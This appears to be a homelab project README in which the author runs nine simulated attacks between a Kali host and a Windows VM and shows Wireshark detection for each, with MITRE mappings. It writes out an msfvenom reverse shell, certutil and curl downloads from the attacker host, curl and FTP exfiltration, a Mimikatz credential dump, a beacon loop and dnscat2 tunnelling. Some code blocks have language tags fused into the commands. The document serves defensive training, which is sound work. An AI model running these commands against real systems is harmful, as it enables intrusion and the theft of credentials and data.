# 🔍 Network Analysis Project

## 📌 Overview
This project demonstrates **end-to-end adversary simulation and network traffic analysis** in a controlled homelab environment.  
By generating malicious traffic myself (instead of using pre-made PCAPs), I captured it in real-time and analyzed it in Wireshark to showcase how a SOC analyst detects and responds to real-world threats. This hands-on approach highlights practical skills in red teaming, packet capture, forensic analysis, and threat mapping.

I acted as both:
- **Red Team (Attacker):** Simulating MITRE ATT&CK techniques such as command-and-control (C2), data exfiltration, credential access, and lateral movement.
- **Blue Team (Defender):** Capturing PCAPs, analyzing traffic in Wireshark, and developing detection rules mapped to MITRE ATT&CK.

---

## 🖥️ Lab Setup
- **Attacker:** Kali Linux (`192.168.2.131`)
- **Victim:** Windows 10 FLARE VM (`192.168.2.129`)
- **Sniffer:** Wireshark (running on Windows for packet capture). For this lab, I applied custom filters along with Basic, Basic+, and Basic+DNS profiles to reduce noise and highlight relevant traffic. This allowed me to focus on HTTP requests, TLS handshakes, and DNS queries, while filtering out unnecessary broadcast traffic.
- **Network:** VirtualBox Host-Only Network (isolated for safety).
- **Tools Used:** msfvenom, netcat (nc), certutil, ftp, custom scripts for beaconing; Wireshark for analysis; Sysmon for endpoint correlation (where applicable).

---

## 🎯 Objectives
- Generate **realistic malicious traffic** across the attack lifecycle (initial access, execution, persistence, exfiltration).
- Capture all traffic in **PCAP format** for forensic replay.
- Perform **deep packet inspection** with Wireshark filters and stream reconstruction.
- Map detections to the **MITRE ATT&CK framework** for threat intelligence alignment.
- Identify IOCs and recommend defenses to enhance SOC workflows.

---

## ⚔️ Red Team vs Blue Team Scenarios

### ✅ Scenario 1 — Reverse Shell (C2 over TCP)
- **Red Team Action:**  
  - Generated a reverse shell payload with `msfvenom`:
    ```bash
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.2.131 LPORT=4444 -f exe -o payload.exe

Hosted the payload on Kali and delivered it via certutil on the victim:
cmdcertutil -urlcache -split -f http://192.168.2.131:8080/payload.exe payload.exe
Executed the payload on the victim to establish a reverse shell back to the attacker (using nc -lvnp 4444 on Kali).

### Blue Team Detection (Wireshark):
Filter:
 ```wireshark
(http.request or tls.handshake.type==1) and !(ssdp)
 ```

Observed outbound connection from victim to attacker, followed by command execution.
MITRE Mapping: T1071 – Application Layer Protocol (C2); T1059 – Command and Scripting Interpreter.

---

#### ✅ Scenario 2 — Data Exfiltration via HTTP

- **Red Team Action:**
Simulated exfiltration of sensitive data by uploading a file via HTTP POST from the victim:
 ```cmd
cmdcurl -X POST -F "file=@secrets.txt" http://192.168.2.131:8080/exfil
 ```
Attacker received the file on Kali using a simple Python HTTP server with POST handling.

Blue Team Detection (Wireshark):

Filter:
 ```wireshark
(http.request or tls.handshake.type==1) and !(ssdp)
 ```
Focused on HTTP requests and TLS handshakes while filtering out SSDP noise. Detected abnormal outbound HTTP POST traffic with file uploads, then reconstructed the exfiltrated file from the stream.
MITRE Mapping: T1041 – Exfiltration Over C2 Channel; T1567 – Exfiltration Over Web Service.

---


### ✅ Scenario 3 — Credential Harvesting (Simulated)

- **Red Team Action:**
Simulated dumping credentials using Mimikatz on the victim and exfiltrating them over HTTPS:
cmdmimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

Sent the output to the attacker via a secure POST request.


Blue Team Detection (Wireshark):

Filter:
 ```wireshark
wiresharktls.handshake.extensions_server_name == attacker.domain && http.request.method == "POST"
 ```

Identified encrypted POST data with patterns matching base64-encoded credentials; noted unusual process connections.
Sysmon Integration: Event ID 1 - Process Create for mimikatz.exe.
MITRE Mapping: T1003 – OS Credential Dumping; T1040 – Network Sniffing.

---

### ✅ Scenario 4 — Beaconing Behavior (C2 Heartbeats)

- **Red Team Action:**
Deployed a custom beacon script on the victim that sent periodic HTTP requests to the attacker:
powershellwhile ($true) { Invoke-WebRequest -Uri http://192.168.2.131:8080/beacon -Method GET; Start-Sleep -Seconds 10 }

Attacker monitored for check-ins on Kali.


Blue Team Detection (Wireshark):

Filter:
 ```wireshark
wiresharkhttp.request.uri contains "beacon" and tcp.port == 8080
 ```

Detected regular, timed outbound GET requests with no payload variation, indicating automated C2.
Sysmon Integration: Event ID 3 - Network Connection showing repeated connections.
MITRE Mapping: T1071.001 – Application Layer Protocol: Web Protocols; T1571 – Non-Standard Port.

---


### ✅ Scenario 5 — File Transfer via FTP

- **Red Team Action:**
Used the built-in Windows FTP client to exfiltrate a file:
cmdftp 192.168.2.131
user anonymous
pass anonymous
put confidential.docx
bye

Attacker ran an FTP server on Kali to receive the file.


Blue Team Detection (Wireshark):

Filter:
 ```wireshark
wiresharkftp or ftp-data
 ```

Captured clear-text FTP commands, credentials, and file transfers; reconstructed the uploaded file.
Sysmon Integration: Event ID 11 - File Create on the attacker side for the received file.
MITRE Mapping: T1048 – Exfiltration Over Alternative Protocol; T1020 – Automated Exfiltration.


---

### ✅ Scenario 6 — DNS Tunneling for C2

- **Red Team Action:**
Used dnscat2 on the victim to establish a C2 channel via DNS queries:
 ```bash
bashdnscat2 --dns domain=attacker.domain --port 53
 ```
Attacker ran the dnscat2 server on Kali to receive tunneled commands.


Blue Team Detection (Wireshark):

Filter:
wiresharkdns.qry.type == TXT or dns.qry.type == AAAA

Observed unusually long or frequent DNS queries with encoded payloads, indicating tunneling.
Sysmon Integration: Event ID 22 - DNS Query for suspicious domains.
MITRE Mapping: T1071.004 – Application Layer Protocol: DNS; T1572 – Protocol Tunneling.

---


### ✅ Scenario 7 — SMB Lateral Movement

- **Red Team Action:**
From the victim, used Impacket's smbclient to move laterally to another host and execute a command:
 ```bash
bashsmbclient.py DOMAIN/user:password@192.168.2.130 -c "dir"
 ```
Simulated file copy or remote execution.


Blue Team Detection (Wireshark):

Filter:
wiresharksmb2 or smb

Detected SMB sessions with file listings or writes; noted unusual authentication attempts.
Sysmon Integration: Event ID 3 - Network Connection to SMB ports (445).
MITRE Mapping: T1021.002 – Remote Services: SMB/Windows Admin Shares; T1570 – Lateral Tool Transfer.


---

### ✅ Scenario 8 — Ransomware Simulation (File Encryption Traffic)

- **Red Team Action:**
Deployed a simulated ransomware payload that encrypted files and exfiltrated a ransom note via HTTPS:
powershellGet-ChildItem -Path C:\Data -Recurse | ForEach-Object { $_.FullName + ".encrypted" } # Simulated encryption
Invoke-WebRequest -Uri http://192.168.2.131:8080/ransom_note.txt -Method POST -Body "Pay up!"

Attacker received the note on Kali.


Blue Team Detection (Wireshark):

Filter:
wiresharkhttp contains "encrypted" or tls.handshake.extensions_server_name == "attacker.domain"

Identified rapid file access patterns followed by exfiltration; reconstructed encrypted file metadata.
Sysmon Integration: Event ID 11 - File Create for .encrypted files.
MITRE Mapping: T1486 – Data Encrypted for Impact; T1041 – Exfiltration Over C2 Channel.

---


### ✅ Scenario 9 — Phishing Link Resolution and Callback

- **Red Team Action:**
Simulated a phishing email click by resolving a malicious domain and calling back for a payload:
cmdnslookup malicious.attacker.domain
curl http://malicious.attacker.domain/payload.js

Attacker hosted the domain on Kali with a DNS server.


Blue Team Detection (Wireshark):

Filter:
wiresharkdns or http.request.uri contains "malicious"

Captured DNS resolution followed by HTTP callback; flagged unknown domains.
Sysmon Integration: Event ID 22 - DNS Query for suspicious resolutions.
MITRE Mapping: T1566 – Phishing; T1598 – Phishing for Information.


---

### 📂 Evidence Collected

### PCAP Traffic Captures

| File Name                     | Description                         |
|-------------------------------|-------------------------------------|
| `reverse_shell.pcap`           | Reverse shell traffic capture        |
| `data_exfiltration.pcap`       | HTTP exfiltration traffic            |
| `credential_harvest.pcap`      | Simulated dumping and exfiltration  |
| `beaconing.pcap`               | Periodic C2 check-ins                |
| `ftp_exfiltration.pcap`        | Clear-text FTP transfer              |
| `dns_tunneling.pcap`           | DNS-based C2                         |
| `smb_lateral.pcap`             | SMB lateral movement                 |
| `ransomware_encryption.pcap`   | File encryption and exfiltration     |
| `phishing_callback.pcap`       | DNS resolution and callback          |
---

### Threat Observations

- **Reverse Shells:** Often manifest as persistent outbound connections to non-standard ports with interactive data.  
- **Data Exfiltration:** Detectable via anomalous data volumes in HTTP, FTP, or SMB traffic.  
- **Credential Dumping:** Shows encoded or unusual payloads in POST requests.  
- **Beaconing:** Reveals timed, repetitive patterns without user interaction.  
- **DNS Tunneling:** Appears as oversized or high-volume queries.  
- **SMB Lateral Movement:** Involves admin share access and file transfers.  
- **Ransomware Traffic:** Includes rapid file operations followed by exfiltration.  
- **Phishing Callbacks:** Start with suspicious DNS resolutions to unknown domains.  

 
---


### 📊 MITRE ATT&CK Mapping

| Scenario                 | Technique ID           | Name                                               |
|--------------------------|----------------------|--------------------------------------------------|
| Reverse Shell            | T1071, T1059         | Application Layer Protocol (C2); Command and Scripting Interpreter |
| Data Exfiltration        | T1041, T1567         | Exfiltration Over C2 Channel; Exfiltration Over Web Service |
| Credential Harvesting    | T1003, T1040         | OS Credential Dumping; Network Sniffing         |
| Beaconing                | T1071.001, T1571     | Application Layer Protocol: Web Protocols; Non-Standard Port |
| FTP Exfiltration         | T1048, T1020         | Exfiltration Over Alternative Protocol; Automated Exfiltration |
| DNS Tunneling            | T1071.004, T1572     | Application Layer Protocol: DNS; Protocol Tunneling |
| SMB Lateral Movement     | T1021.002, T1570     | Remote Services: SMB/Windows Admin Shares; Lateral Tool Transfer |
| Ransomware Simulation    | T1486, T1041         | Data Encrypted for Impact; Exfiltration Over C2 Channel |
| Phishing Link Resolution | T1566, T1598         | Phishing; Phishing for Information              |
